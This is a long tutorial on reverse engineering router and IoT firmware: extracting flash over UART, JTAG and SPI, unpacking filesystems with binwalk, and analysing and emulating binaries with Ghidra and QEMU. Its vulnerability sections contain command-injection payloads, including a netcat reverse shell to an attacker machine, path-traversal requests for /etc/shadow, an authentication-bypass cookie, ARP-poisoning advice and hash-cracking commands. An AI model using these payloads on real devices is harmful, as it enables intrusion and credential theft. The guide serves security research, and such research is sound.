# ⚙️ Firmware Reverse Engineering — Complete Guide

### IoT, Routers, Embedded Devices: Extract, Analyze, and Emulate

> **Who is this for?** You want to analyze firmware from routers, smart devices, cameras, and embedded systems — extract filesystems, find hardcoded credentials, identify vulnerabilities, and understand how embedded software works.

---

## 📚 Table of Contents

1. [What is Firmware?](#1-what-is-firmware)
2. [Hardware Interfaces](#2-hardware-interfaces)
3. [Getting the Firmware](#3-getting-the-firmware)
4. [Firmware Analysis with Binwalk](#4-firmware-analysis-with-binwalk)
5. [Filesystem Extraction and Analysis](#5-filesystem-extraction-and-analysis)
6. [Binary Analysis on Embedded Targets](#6-binary-analysis-on-embedded-targets)
7. [Finding Vulnerabilities in Firmware](#7-finding-vulnerabilities-in-firmware)
8. [Emulating Firmware with QEMU](#8-emulating-firmware-with-qemu)
9. [Dynamic Analysis of Embedded Binaries](#9-dynamic-analysis-of-embedded-binaries)
10. [Common IoT Vulnerabilities](#10-common-iot-vulnerabilities)
11. [Tools Reference](#11-tools-reference)
12. [Practice Resources](#12-practice-resources)

---

## 1. What is Firmware?

Firmware is software permanently stored in a device's flash memory. Unlike your PC's OS, it's tightly integrated with the hardware.

### Types of Devices with Firmware

| Device Type    | Examples                        | Typical CPU         |
| -------------- | ------------------------------- | ------------------- |
| Home routers   | TP-Link, Netgear, ASUS          | MIPS, ARM           |
| IP cameras     | Hikvision, Dahua, cheap Chinese | MIPS, ARM           |
| Smart TVs      | Samsung, LG, Roku               | ARM                 |
| IoT sensors    | Smart plugs, thermostats        | ARM Cortex-M, ESP32 |
| NAS devices    | Synology, QNAP                  | x86, ARM            |
| Industrial PLC | Siemens, ABB                    | Various             |
| Printers       | HP, Canon                       | MIPS, ARM           |

### Why Reverse Engineer Firmware?

- **Find backdoors**: Many devices have hardcoded credentials
- **Vulnerability research**: Find buffer overflows, command injections
- **Understanding behavior**: What data does a smart device collect?
- **Jailbreaking**: Run your own code on a device
- **Interoperability**: Understand protocols for integration

### Firmware Architecture

```
┌─────────────────────────────────────────────┐
│           Flash Memory (ROM/NAND/NOR)        │
│                                              │
│  ┌────────────────────────────────────────┐ │
│  │  Bootloader (U-Boot usually)           │ │
│  │  Initializes hardware, loads kernel    │ │
│  ├────────────────────────────────────────┤ │
│  │  Linux Kernel (usually)                │ │
│  │  Compressed (zImage, uImage)           │ │
│  ├────────────────────────────────────────┤ │
│  │  Root Filesystem                       │ │
│  │  SquashFS, JFFS2, CRAMFS, ext2         │ │
│  │  Contains: /bin, /etc, /var, /www      │ │
│  └────────────────────────────────────────┘ │
└─────────────────────────────────────────────┘
↕ runs on
┌─────────────────────────────────────────────┐
│           Hardware                           │
│  CPU (MIPS/ARM) + RAM + Flash + Peripherals │
└─────────────────────────────────────────────┘
```

---

## 2. Hardware Interfaces

Before you can extract firmware, you need to understand the physical hardware interfaces.

### UART (Universal Asynchronous Receiver/Transmitter)

UART is essentially a serial port — the most common debug interface on embedded devices. It usually gives you a Linux shell during boot!

```
Device PCB has 4 pins (look for unpopulated header):
VCC  → Power (3.3V usually — DO NOT use 5V on 3.3V devices!)
GND  → Ground
TX   → Device transmits data (connect to your RX)
RX   → Device receives data (connect to your TX)

TX and RX are labeled from the device's perspective.
Cross-connect: Device TX → Your RX, Device RX → Your TX
```

**Finding UART on a PCB:**

```
1. Look for rows of 3-5 through-holes or test pads
2. Common locations: near the main CPU, edge of board
3. Use multimeter:
- Set to DC voltage
- GND reference against known ground
- At boot, TX pin will show 3.3V with brief fluctuations
- VCC pin stays at 3.3V
- GND stays at 0V
- RX stays at 3.3V (idle)

4. Use oscilloscope or logic analyzer to find baud rate
Most common: 115200, 57600, 38400, 9600
```

**Connecting via USB-to-Serial adapter:**

```bash
# Hardware needed:
# - USB to TTL serial adapter (CP2102 or CH340, ~$3)
# - Jumper wires

# Connect:
# Adapter GND → Device GND
# Adapter TX  → Device RX
# Adapter RX  → Device TX
# (DO NOT connect VCC unless device needs power from adapter)

# Install driver (usually auto-detected on Linux)
# Adapter appears as /dev/ttyUSB0

# Connect with minicom or screen:
sudo apt install minicom screen

screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200

# Power on the device
# You should see bootloader output, then Linux boot messages
# If you see garbled text → try different baud rates: 57600, 38400, 9600
```

**Interrupting the bootloader (U-Boot):**

```
During boot, there's a brief window to press a key (usually 1-3 seconds):
Press any key, space, Ctrl+C, or a specific key

U-Boot prompt: =>

Useful U-Boot commands:
printenv          # Print all environment variables
setenv bootdelay 30  # More time to interact
boot              # Continue normal boot

# Dump flash memory
md.b 0xBF000000 0x1000  # Memory dump (hex format)

# TFTP boot (load from network)
setenv ipaddr 192.168.1.100
setenv serverip 192.168.1.200
tftpboot 0x80000000 firmware.bin
```

### JTAG (Joint Test Action Group)

JTAG gives you full control over the CPU — pause, step, read/write any memory. It's the hardware equivalent of a debugger.

```
Typically 10-20 pin header (JTAG connector)
Common pinout:
TCK   → Test Clock
TMS   → Test Mode Select
TDI   → Test Data In
TDO   → Test Data Out
TRST  → Test Reset (optional)
GND   → Ground
VCC   → Reference voltage

Hardware needed:
- JTAG adapter: JLink, OpenOCD-compatible FTDI, Bus Pirate
- Software: OpenOCD

# Connect with OpenOCD
sudo openocd -f interface/jlink.cfg -f target/ar9331.cfg

# In another terminal, connect to OpenOCD
telnet localhost 4444

# OpenOCD commands:
> halt                    # Stop CPU
> reg                     # Show registers
> mdw 0x80000000 32       # Read 32 words from address
> dump_image rom.bin 0x1FC00000 0x400000  # Dump flash to file
> resume                  # Continue execution
```

### SPI Flash Extraction (Chip-Off)

Many devices store firmware in an SPI flash chip. You can read it directly with a programmer.

```
Common chips: W25Q32, MX25L3206E, EN25Q64
Identify: Find the 8-pin SOIC chip, read the markings

Hardware needed:
- CH341A programmer (~$5 on Amazon/AliExpress)
- SOIC-8 clip (connects without desoldering!)
- Flashrom software

# Identify the chip
flashrom -p ch341a_spi

# Read firmware
flashrom -p ch341a_spi -r firmware_backup.bin

# Verify read (read twice, compare)
flashrom -p ch341a_spi -r firmware_backup2.bin
md5sum firmware_backup.bin firmware_backup2.bin
# Should be identical

# Write modified firmware (dangerous! could brick device)
flashrom -p ch341a_spi -w firmware_modified.bin
```

---

## 3. Getting the Firmware

Multiple ways to get firmware — ordered from easiest to hardest.

### Method 1: Download from Manufacturer (Easiest!)

```bash
# Check manufacturer's support page
# Example: TP-Link, Netgear, Linksys

# Direct download
wget https://www.tp-link.com/us/support/download/[model]/v[version]/
# Or just Google: "[device model] firmware download"

# Common formats:
# .bin, .img, .tar.gz, .zip containing .bin

# Verify integrity if checksum is provided
md5sum firmware.bin
sha256sum firmware.bin
```

### Method 2: Intercept the Update Process

Devices download updates over the network — intercept it:

```bash
# Method A: Redirect DNS (using your router)
# Add to /etc/hosts on your DNS server:
192.168.1.100   updates.devicemaker.com

# Start a web server to log requests
python3 -m http.server 80

# When device checks for updates, it connects to YOUR server
# Log the real URL being requested

# Method B: ARP poisoning / MITM
# Use arpspoof or Bettercap to intercept device's traffic
# See what URL it downloads firmware from
# Download that firmware yourself
```

### Method 3: Extract from Running Device

```bash
# SSH/Telnet access to device
ssh root@192.168.1.1
telnet 192.168.1.1

# Read flash directly
cat /dev/mtd0 > /tmp/firmware_part0.bin
cat /dev/mtd1 > /tmp/firmware_part1.bin

# Show partition layout
cat /proc/mtd
# Output:
# dev:    size   erasesize  name
# mtd0: 00020000 00010000 "u-boot"
# mtd1: 000e0000 00010000 "kernel"
# mtd2: 00700000 00010000 "rootfs"
# mtd3: 007e0000 00010000 "firmware"

# Transfer to your machine
scp root@192.168.1.1:/tmp/firmware*.bin ./

# Or use dd
dd if=/dev/mtdblock2 of=/tmp/rootfs.bin bs=1M
```

### Method 4: UART Boot Interruption

```bash
# After connecting UART:
# 1. Interrupt U-Boot (press key during boot countdown)
# 2. Use TFTP to load a custom kernel that gives shell

# In U-Boot:
=> setenv ipaddr 192.168.1.100
=> setenv serverip 192.168.1.200  # Your machine

# On your machine, start TFTP server:
sudo apt install tftpd-hpa
sudo cp custom_initrd.cpio.gz /var/lib/tftpboot/

# In U-Boot, load and boot:
=> tftpboot 0x80000000 custom_initrd.cpio.gz
=> bootm 0x80000000
# Custom shell boots
```

---

## 4. Firmware Analysis with Binwalk

Binwalk is the essential firmware analysis tool — it identifies and extracts components from firmware images.

### Installation

```bash
# Install binwalk
sudo apt install binwalk
# or from source for latest version:
git clone https://github.com/ReFirmLabs/binwalk
cd binwalk && sudo python3 setup.py install

# Install dependencies for extraction
sudo apt install -y squashfs-tools \
sasquatch \
zlib1g-dev \
liblzma-dev \
python3-lzma
```

### Basic Binwalk Analysis

```bash
# Scan and identify contents
binwalk firmware.bin

# Example output:
# DECIMAL    HEXADECIMAL   DESCRIPTION
# ───────────────────────────────────────────────────────
# 0          0x0           uImage header, ...
# 64         0x40          LZMA compressed data, ...
# 1048576    0x100000      Squashfs filesystem, big-endian,
#                          data offset: 0x60, 26 inodes
# 5242880    0x500000      JFFS2 filesystem, big-endian,
#                          node count: 128

# Extract everything automatically
binwalk -e firmware.bin
# Creates: _firmware.bin.extracted/

# Entropy analysis (find encrypted/compressed sections)
binwalk -E firmware.bin
# High entropy (close to 8.0) = likely encrypted or compressed
# Low entropy = likely data or code

# Extract with depth control
binwalk -e -M firmware.bin    # Matryoshka: extract recursively
```

### Understanding Binwalk Output

```
Entropy graph:
0.0 ─── flat        = structured data (code, config files)
5.0 ─── moderate    = compressed data
7.5+─── near-flat   = encrypted data (can't analyze without key)
8.0 ─── perfect     = random = encrypted

Signatures to watch for:
uImage header     → Linux boot image (kernel)
LZMA              → Compressed kernel
SquashFS          → Read-only filesystem (contains all the files!)
JFFS2             → Writable filesystem (config, logs)
CramFS            → Compressed read-only filesystem
CPIO archive      → Another filesystem format
gzip              → Compressed data
U-Boot            → Bootloader
Certificate       → SSL/TLS certs (extract for analysis)
Private key       → Private keys hardcoded in firmware!
```

### Manual Extraction (When Binwalk Fails)

```bash
# Find offset manually
binwalk firmware.bin | grep -i squashfs
# Let's say offset is 1048576 (0x100000)

# Extract from that offset
dd if=firmware.bin bs=1 skip=1048576 of=rootfs.squashfs

# Mount SquashFS
sudo unsquashfs rootfs.squashfs
# Creates: squashfs-root/

# For JFFS2
modprobe mtdram total_size=32768 erase_size=256
modprobe mtdblock
modprobe jffs2
dd if=firmware.bin bs=1 skip=[jffs2_offset] of=jffs2.bin
dd if=jffs2.bin of=/dev/mtdblock0
mount -t jffs2 /dev/mtdblock0 /mnt/jffs2

# For cramfs
mount -o loop cramfs.img /mnt/cramfs

# For CPIO
cpio -idmv < initrd.cpio
```

---

## 5. Filesystem Extraction and Analysis

Once you've extracted the filesystem, this is where the real RE begins.

### Exploring the Filesystem

```bash
cd squashfs-root/   # or wherever binwalk extracted to

# Explore structure
ls -la
# Typical embedded Linux structure:
# bin/     → Executable programs (busybox, etc.)
# etc/     → Configuration files ← GOLD MINE
# lib/     → Libraries
# usr/     → More programs and libraries
# var/     → Variable data (symlinked, usually)
# www/     → Web server files ← API endpoints, credentials
# tmp/     → Temp directory
# sbin/    → System executables

# Find all executables
find . -type f -executable 2>/dev/null

# Check what architecture binaries are
file bin/busybox
# busybox: ELF 32-bit MSB executable, MIPS, ...

# Check architecture of ALL binaries
find . -type f -exec file {} \; | grep ELF | head -20
```

### Mining for Credentials and Secrets

```bash
# PASSWORD FILES
cat etc/passwd
cat etc/shadow    # Hashed passwords!

# Common default credentials in firmware:
# admin:admin
# admin:password
# admin:1234
# root:root

# Crack shadow hashes with hashcat:
hashcat -m 1800 shadow_hash.txt wordlist.txt   # SHA-512
hashcat -m 500 shadow_hash.txt wordlist.txt    # MD5

# Telnet/SSH config
cat etc/inetd.conf          # What services run?
cat etc/ssh/sshd_config

# Hardcoded credentials in config files
grep -r "password\|passwd\|auth" etc/ -i
grep -r "secret\|key\|token" etc/ -i

# SSL/TLS certificates and private keys
find . -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null
find . -name "*.p12" -o -name "*.pfx" 2>/dev/null

# Look for private keys in any file
grep -r "BEGIN.*PRIVATE KEY" . -l

# AWS/Cloud credentials
grep -r "AKIA[0-9A-Z]{16}\|aws_secret" . -r

# Symmetric encryption keys
grep -r "AES\|DES\|blowfish" etc/ -i

# Scripts with hardcoded credentials
grep -r "admin\|password\|passwd" bin/ sbin/ usr/bin/ -i --include="*.sh"
```

### Web Interface Analysis

Most routers have a web admin interface. Analyze it:

```bash
# Find web root
ls www/
ls var/www/
ls usr/www/
ls home/www/

# Look at CGI scripts (these handle web requests)
find . -name "*.cgi" -o -name "*.php" -o -name "*.asp" 2>/dev/null

# Find command injection vulnerabilities
grep -r "system\|exec\|popen\|passthru\|shell_exec" www/ --include="*.cgi"
grep -r "system\|os.system\|subprocess" usr/ --include="*.py"

# Check Lua scripts (common in OpenWrt)
find . -name "*.lua" | xargs grep -l "os.execute\|io.popen"

# Look for authentication bypass patterns
grep -r "noauth\|skip.*auth\|bypass" . -i

# Find API endpoints
grep -r "api\|/cgi-bin\|/admin" www/ -i -l

# Check for debug endpoints
grep -r "debug\|test\|backdoor" www/ -i
```

**Example: Finding a command injection:**

```sh
# In www/cgi-bin/ping.cgi:
#!/bin/sh
IP=$QUERY_STRING
result=$(ping -c 1 $IP)    # NO SANITIZATION!
echo "Content-type: text/html"
echo ""
echo "<pre>$result</pre>"

# Vulnerable!
# Request: /cgi-bin/ping.cgi?8.8.8.8;cat /etc/passwd
# This executes: ping -c 1 8.8.8.8;cat /etc/passwd
```

### Finding Encryption Keys

````bash
# Search for hardcoded keys
grep -r "key\s*=" etc/ -i
grep -r "password\s*=" etc/ -i

# Look for certificates
find . -name "*.pem" -exec openssl x509 -text -in {} \; 2>/dev/null | grep -E "Subject|Issuer|Not"

# Find entropy high-value data (possible keys)
python3 -c "
import os, math
from collections import Counter

def entropy(data):
if not data: return 0
	counter = Counter(data)
	length = len(data)
	return -sum((c/length)*math.log2(c/length) for c in counter.values())

	# Scan all small files for high-entropy data (possible keys)
	for root, dirs, files in os.walk('.'):
		for f in files:
			path = os.path.join(root, f)
			try:
			with open(path, 'rb') as fh:
			data = fh.read()
			if 16 <= len(data) <= 256:  # Key-sized files
				e = entropy(data)
				if e > 7.0:
					print(f'High entropy ({e:.2f}): {path} ({len(data)} bytes)')
					except: pass
					"
					```

### Identifying Startup Scripts

```bash
# Init system (how services start)
cat etc/inittab          # SysV init
cat etc/init.d/*         # Init scripts
cat etc/rc.d/*           # Run-level scripts
cat etc/rcS              # Main startup script

# Systemd (less common in embedded)
ls etc/systemd/system/

# What's running at boot?
grep -r "telnetd\|httpd\|dropbear\|sshd" etc/ -r

# Are there any backdoors in startup?
grep -r "nc\|netcat\|/bin/sh\|reverse" etc/init.d/ etc/rc* -r

# Check crontabs (scheduled tasks)
cat var/spool/cron/crontabs/root 2>/dev/null
cat etc/cron* 2>/dev/null
````

---

## 6. Binary Analysis on Embedded Targets

Embedded binaries (MIPS, ARM, etc.) are analyzed just like x86 — but with different registers and calling conventions.

### Setting Up Ghidra for Embedded RE

```
1. Open Ghidra → New Project → Import File
2. Select the binary (e.g., httpd, telnetd, or custom daemon)
3. Ghidra auto-detects:
"MIPS:BE:32:default" or "ARM:LE:32:default"
4. Run Analysis → Auto Analyze
5. Navigate to interesting functions

Useful Ghidra features for embedded:
- Functions window: see all identified functions
- Strings window: Window → Defined Strings
- Symbol table: useful to find strcmp, system, etc.
```

### Key Functions to Find in Embedded Binaries

```
system()        → Executes shell command (command injection target)
popen()         → Same, but reads output
execve()        → Execute program
printf()        → Format string vulnerabilities
sprintf()       → Buffer overflow (no bounds checking)
strcpy()        → Buffer overflow
gets()          → Buffer overflow (always vulnerable!)
strcmp()        → Authentication checks
strncmp()       → Authentication checks
atoi()          → Integer parsing
malloc/free     → Heap operations
socket/connect  → Network connections
```

**Finding dangerous functions in Ghidra:**

```
Window → Symbol References
Search for: system, strcpy, gets, sprintf

Or in Disassembly:
Ctrl+F → search for "system"
Window → Show References → see all calls to system()
```

### MIPS Assembly Basics

Many routers use MIPS CPUs. Key differences from x86:

```mips
# MIPS Registers
$zero / $0   → Always 0
$v0, $v1     → Return values
$a0-$a3      → Function arguments (first 4)
$t0-$t9      → Temporary (not preserved across calls)
$s0-$s7      → Saved (preserved)
$sp          → Stack pointer
$ra          → Return address (like x86's saved return addr on stack)
$pc          → Program counter

# Key difference from x86:
# MIPS uses $ra register for return address
# Not on the stack like x86!
# Return is: jr $ra

# Common patterns:
lui  $a0, 0x4          # Load upper 16 bits
ori  $a0, $a0, 0x1234  # Load address of string
jal  printf            # Jump and link (call)
jr   $ra               # Return

# Load/store
lw   $t0, 0($sp)       # Load word from stack
sw   $t0, 4($sp)       # Store word to stack
lb   $t0, 0($a0)       # Load byte
```

### ARM Assembly Basics

Most modern IoT devices use ARM:

```arm
# ARM Registers
R0-R3    → Arguments + return values
R4-R11   → Saved registers
R12      → Intra-procedure call scratch
R13/SP   → Stack pointer
R14/LR   → Link register (return address)
R15/PC   → Program counter
CPSR     → Status register (flags)

# Key difference from x86:
# ARM uses LR (link register) for return address
# Return is: BX LR  or  POP {PC}

# Common ARM patterns:
PUSH {R4-R7, LR}   # Save registers + LR (function start)
POP  {R4-R7, PC}   # Restore + return (function end)

MOV  R0, #5        # R0 = 5
ADD  R0, R1, R2    # R0 = R1 + R2
LDR  R0, [R1]      # R0 = *R1 (dereference)
STR  R0, [R1, #4]  # *(R1+4) = R0
BL   printf        # Call printf (Branch with Link)
BX   LR            # Return

# Thumb mode (compressed 16-bit instructions, very common)
.thumb or .thumb_func in disassembly
```

---

## 7. Finding Vulnerabilities in Firmware

### Command Injection

The most common vulnerability in embedded web interfaces:

```bash
# In Ghidra, find calls to system() in httpd binary
# Look for code like:

# C code equivalent:
char cmd[256];
char ip_param[64];
get_parameter("ip", ip_param);        // Get HTTP parameter
sprintf(cmd, "ping -c 1 %s", ip_param); // Build command
system(cmd);                           // Execute!

# If ip_param = "8.8.8.8; cat /etc/passwd"
# Command becomes: "ping -c 1 8.8.8.8; cat /etc/passwd"
# Second command executes too!
```

**Testing for command injection:**

```
Normal request:
GET /ping?ip=8.8.8.8

Injection test:
GET /ping?ip=8.8.8.8;id
GET /ping?ip=8.8.8.8$(id)
GET /ping?ip=8.8.8.8`id`
GET /ping?ip=8.8.8.8%3Bid   (%3B = ; URL encoded)

If you see "uid=0(root)" in response → command injection!

Reverse shell:
GET /ping?ip=8.8.8.8;nc+192.168.1.200+4444+-e+/bin/sh
```

### Buffer Overflows in Embedded

```c
// Common vulnerable pattern in firmware:
void handle_request(char *request) {
	char buffer[256];
	strcpy(buffer, request);  // NO BOUNDS CHECK!
	// If request > 256 bytes → overflow!
}
```

**Finding buffer overflows statically:**

```bash
# Look for dangerous functions
strings httpd | grep -c strcpy   # Count occurrences
strings httpd | grep -c gets

# In Ghidra:
# Find calls to strcpy, gets, sprintf
# Check if length is validated before the call
# If not → potential buffer overflow
```

### Path Traversal

Common in web interfaces:

```bash
# Test:
GET /cgi-bin/readfile?file=../../etc/passwd
GET /cgi-bin/readfile?file=/etc/shadow
GET /cgi-bin/readfile?file=../../../etc/shadow%00.jpg  # Null byte injection
```

### Authentication Bypass

```bash
# Check CGI scripts for auth checks:
grep -r "auth\|login\|session" www/ -r

# Common bypass patterns:
# 1. Magic cookie values
curl -b "admin=1" http://192.168.1.1/admin/

# 2. Hardcoded backdoor passwords
# Look in strings: strings httpd | grep -i "admin\|backdoor\|factory"

# 3. Predictable session IDs
# Look at how session tokens are generated
# If it's based on timestamp or MAC address → predictable!

# 4. Hidden pages that skip auth
grep -r "noauth\|skipauth\|bypass" www/ -i
```

---

## 8. Emulating Firmware with QEMU

Instead of needing physical hardware, run firmware in a virtual machine.

### QEMU Setup

```bash
# Install QEMU for various architectures
sudo apt install qemu-user-static \
qemu-system-mips \
qemu-system-arm \
qemu-system-x86_64

# For user-mode emulation (single binary):
sudo apt install qemu-user-static binutils-mips-linux-gnu
```

### Running Single Binaries (User-Mode Emulation)

The easiest approach — run a single binary from the firmware:

```bash
cd squashfs-root/

# MIPS binary
qemu-mips-static -L . ./bin/busybox ls

# MIPS big-endian
qemu-mips-static -L . ./usr/bin/httpd

# ARM binary
qemu-arm-static -L . ./bin/some_arm_binary

# The -L . flag tells QEMU to use current dir as root FS
# This means library paths like /lib/libc.so resolve to ./lib/libc.so

# Make all binaries use QEMU transparently
sudo cp $(which qemu-mips-static) usr/bin/
sudo cp $(which qemu-arm-static) usr/bin/
sudo chroot . /bin/sh   # Full chroot into firmware filesystem!
```

### Chroot into Firmware

```bash
# This gives you a shell running inside the firmware's filesystem!
cd squashfs-root/

# Copy QEMU binary needed for the architecture
sudo cp /usr/bin/qemu-mips-static usr/bin/   # for MIPS
# or
sudo cp /usr/bin/qemu-arm-static usr/bin/    # for ARM

# Mount necessary pseudo-filesystems
sudo mount -t proc /proc proc/
sudo mount -t sysfs /sys sys/
sudo mount -o bind /dev dev/

# Enter the chroot
sudo chroot . /bin/sh

# Now you're running inside the firmware!
# Run services:
/usr/sbin/httpd -p 8080   # Start web server

# Exit
exit
sudo umount proc/ sys/ dev/
```

### Full System Emulation

For complete emulation (entire device including kernel):

```bash
# Example: Emulate MIPS router firmware

# Extract kernel and rootfs from firmware
binwalk -e firmware.bin
# kernel: _firmware.bin.extracted/uImage-kernel.bin
# rootfs: _firmware.bin.extracted/squashfs-root/

# Create disk image with rootfs
dd if=/dev/zero of=rootfs.ext2 bs=1M count=64
mkfs.ext2 rootfs.ext2
sudo mount -o loop rootfs.ext2 /mnt/firmware
sudo cp -r squashfs-root/. /mnt/firmware/
sudo umount /mnt/firmware

# Run in QEMU (MIPS Malta board example)
qemu-system-mips \
-M malta \
-kernel vmlinux-malta \
-hda rootfs.ext2 \
-append "root=/dev/sda" \
-net nic \
-net user,hostfwd=tcp::8080-:80,hostfwd=tcp::2222-:22 \
-nographic

# Access services:
curl http://localhost:8080/      # Web interface
ssh root@localhost -p 2222       # SSH
```

### Firmadyne (Automated Full Emulation)

Firmadyne automates MIPS/ARM firmware emulation:

```bash
# Install
git clone https://github.com/firmadyne/firmadyne.git
cd firmadyne
./download.sh

# Requires PostgreSQL
sudo apt install postgresql
sudo -u postgres createuser -P firmadyne
# password: firmadyne

# Setup database
./setup.sh

# Import firmware
./sources/extractor/extractor.py -b TP-Link \
-sql 127.0.0.1 \
-np -nk \
"firmware.bin" images/

# Identify architecture
./scripts/getArch.sh ./images/1.tar.gz

# Set up filesytem
./scripts/makeImage.sh 1

# Create network config
./scripts/inferNetwork.sh 1

# Emulate!
./scratch/1/run.sh

# Access web interface at the IP shown
```

---

## 9. Dynamic Analysis of Embedded Binaries

### GDB Remote Debugging

Debug a binary running in QEMU or on a real device:

```bash
# On the firmware (device or QEMU):
# Install gdbserver (or it might already be there)
# Check: which gdbserver

# Start gdbserver
gdbserver 0.0.0.0:1234 /usr/sbin/httpd

# On your analysis machine:
gdb-multiarch ./httpd    # Use gdb-multiarch for cross-arch

# In GDB:
(gdb) set architecture mips    # or arm
(gdb) target remote 192.168.1.1:1234
(gdb) break *0x401000      # Set breakpoint
(gdb) continue
(gdb) info registers       # Check registers
(gdb) x/10i $pc            # Disassemble at current instruction
```

### Frida on Embedded Linux

If the device has enough memory and is ARM/MIPS Linux:

```bash
# Download frida-server for the right arch
# https://github.com/frida/frida/releases
# e.g., frida-server-16.x.x-linux-arm

# Copy to device
scp frida-server-linux-arm root@192.168.1.1:/tmp/
ssh root@192.168.1.1 'chmod 755 /tmp/frida-server && /tmp/frida-server &'

# On your machine
frida-ps -H 192.168.1.1     # List processes on device
frida -H 192.168.1.1 -l script.js httpd  # Attach to web server
```

### strace on Firmware

```bash
# On the device or in chroot:
strace -f -o strace.log ./httpd

# See all system calls
# Filter for interesting ones:
grep "open\|read\|write\|execve\|connect" strace.log

# See file access
strace -f -e trace=file ./httpd 2>&1 | grep -v ENOENT

# See network activity
strace -f -e trace=network ./httpd
```

### ltrace (Library Call Tracer)

```bash
# Trace library function calls
ltrace ./httpd

# Filter for specific functions
ltrace -e "strcmp,strcpy,system" ./httpd

# Output shows every strcmp call with its arguments!
# Very useful for finding password checks:
# strcmp("admin", "admin") = 0  ← match!
# strcmp("password123", "badpass") = -1  ← no match
```

---

## 10. Common IoT Vulnerabilities

### CVE Categories for Embedded Devices

**1. Default / Hardcoded Credentials**

```bash
# Always check:
cat etc/passwd
cat etc/shadow
grep -r "admin\|root\|password" etc/ -i

# Common defaults:
# admin:admin
# admin:password
# admin:1234
# root:(empty)
# root:root
# user:user
```

**2. Telnet Enabled by Default**

```bash
# Check startup scripts
grep -r "telnetd" etc/ -r

# If telnet is running on the real device:
telnet 192.168.1.1
# Login with default creds
```

**3. Outdated and Vulnerable Components**

```bash
# Check versions of common software
strings usr/sbin/httpd | grep -i "version\|v[0-9]"
strings bin/busybox | head -5  # BusyBox version
strings lib/libssl.so.* | grep "OpenSSL"  # OpenSSL version

# CVE databases to check:
# nvd.nist.gov
# cve.mitre.org
# vulhub.org.cn
```

**4. Insecure Update Mechanism**

```bash
# How does the device verify firmware updates?
grep -r "verify\|signature\|checksum\|md5\|sha" usr/ -i

# Common issues:
# - No signature verification (any firmware accepted)
# - MD5 only (not cryptographically secure)
# - HTTP instead of HTTPS for download
# - Checksum downloaded from same HTTP URL

# Test: create a modified firmware, does device accept it?
# (Only on devices you own!)
```

**5. Debug Interfaces Left Open**

```bash
# Check for debug ports
grep -r "debug\|telnet\|uart\|console" etc/ -i

# Services that shouldn't be in production:
grep -r "gdbserver\|strace\|debug_mode" etc/ -r

# Hidden web interfaces
find www/ -name "debug*" -o -name "test*" -o -name "diag*"
```

**6. Sensitive Information in Log Files**

```bash
# Check if logs contain sensitive data
find var/log/ -type f | xargs strings | grep -i "pass\|token\|key"

# Debug logging enabled?
grep -r "debug\|verbose\|log_level" etc/ -i
```

### Example: Full Analysis Workflow

```bash
# Scenario: Analyze a cheap IP camera

# 1. Download firmware from manufacturer
wget https://example-camera.com/firmware_v1.2.bin

# 2. Analyze
binwalk firmware_v1.2.bin
# Found: SquashFS at offset 0x100000

# 3. Extract
binwalk -e firmware_v1.2.bin
cd _firmware_v1.2.bin.extracted/squashfs-root/

# 4. Check for vulnerabilities
cat etc/passwd
# root:$1$xyz:0:0:root:/root:/bin/sh   ← Has password
# admin:$1$abc:0:0:admin:/home/admin:/bin/sh

# Check for telnet
grep -r "telnetd" etc/
# etc/init.d/rcS: telnetd &   ← Telnet enabled at boot!

# 5. Crack the password
unshadow etc/passwd etc/shadow > combined.txt
hashcat -m 500 combined.txt /usr/share/wordlists/rockyou.txt
# admin:password123    ← Cracked!

# 6. Find web vulnerabilities
grep -r "system\|exec" www/cgi-bin/ -l
# Found: www/cgi-bin/snapshot.cgi

cat www/cgi-bin/snapshot.cgi
# #!/bin/sh
# CHANNEL=$QUERY_STRING
# ffmpeg -i "rtsp://localhost/$CHANNEL" -frames:v 1 snapshot.jpg
# Command injection! CHANNEL is not sanitized

# 7. Test on real device
curl "http://192.168.1.100/cgi-bin/snapshot.cgi?channel=0;id"
# uid=0(root)   ← Command injection confirmed, running as root!

# 8. Report findings:
# - Telnet enabled with default password
# - Command injection in snapshot.cgi
# - Running as root (no privilege separation)
```

---

## 11. Tools Reference

| Tool               | Use                              | Install                        |
| ------------------ | -------------------------------- | ------------------------------ |
| **binwalk**        | Firmware analysis and extraction | `pip install binwalk`          |
| **squashfs-tools** | SquashFS extraction              | `apt install squashfs-tools`   |
| **QEMU**           | Firmware emulation               | `apt install qemu-user-static` |
| **Ghidra**         | Binary reverse engineering       | ghidra-sre.org                 |
| **radare2**        | CLI binary analysis              | `apt install radare2`          |
| **Firmadyne**      | Automated emulation              | GitHub                         |
| **flashrom**       | SPI flash read/write             | `apt install flashrom`         |
| **openocd**        | JTAG debugging                   | `apt install openocd`          |
| **gdb-multiarch**  | Cross-arch debugging             | `apt install gdb-multiarch`    |
| **file**           | Identify file types              | Pre-installed                  |
| **strings**        | Extract text from binaries       | Pre-installed                  |
| **ltrace**         | Library call tracing             | `apt install ltrace`           |
| **strace**         | System call tracing              | `apt install strace`           |
| **Frida**          | Dynamic instrumentation          | `pip install frida-tools`      |
| **Router Sploit**  | IoT exploit framework            | GitHub                         |

### One-Line Analysis Script

````bash
#!/bin/bash
# firmware_quick_analyze.sh - Quick firmware triage

FW=$1
echo "=== FIRMWARE TRIAGE: $FW ==="

echo "\n[+] File info:"
file "$FW"
md5sum "$FW"

echo "\n[+] Binwalk scan:"
binwalk "$FW"

echo "\n[+] Extracting..."
binwalk -e "$FW" -q

EXTRACT_DIR="_${FW}.extracted"
if [ -d "$EXTRACT_DIR" ]; then
	echo "\n[+] Finding interesting files..."
	find "$EXTRACT_DIR" -name "*.conf" -o -name "*.cfg" \
	-o -name "passwd" -o -name "shadow" | head -20

	echo "\n[+] Looking for credentials..."
	grep -r "password\|passwd" "$EXTRACT_DIR/squashfs-root/etc/" -i 2>/dev/null | head -20

	echo "\n[+] Looking for private keys..."
	grep -r "BEGIN.*PRIVATE KEY" "$EXTRACT_DIR" -l 2>/dev/null

	echo "\n[+] Checking for telnet..."
	grep -r "telnetd" "$EXTRACT_DIR" -r 2>/dev/null | head -5

	echo "\n[+] Web files:"
	find "$EXTRACT_DIR" -name "*.cgi" -o -name "*.php" 2>/dev/null | head -10
	fi
	```

---

## 12. Practice Resources

### Lab Devices (Buy Cheap Second-Hand)

```
Recommended for practice:
TP-Link TL-WR841N     → ~$5-10 used, MIPS, open firmware
TP-Link TL-MR3020     → Portable, easy UART
Netgear WNR1000       → Many CVEs to study
D-Link DIR-615        → Multiple known vulns
Any cheap IP camera from eBay → Often terrible security

Why these?
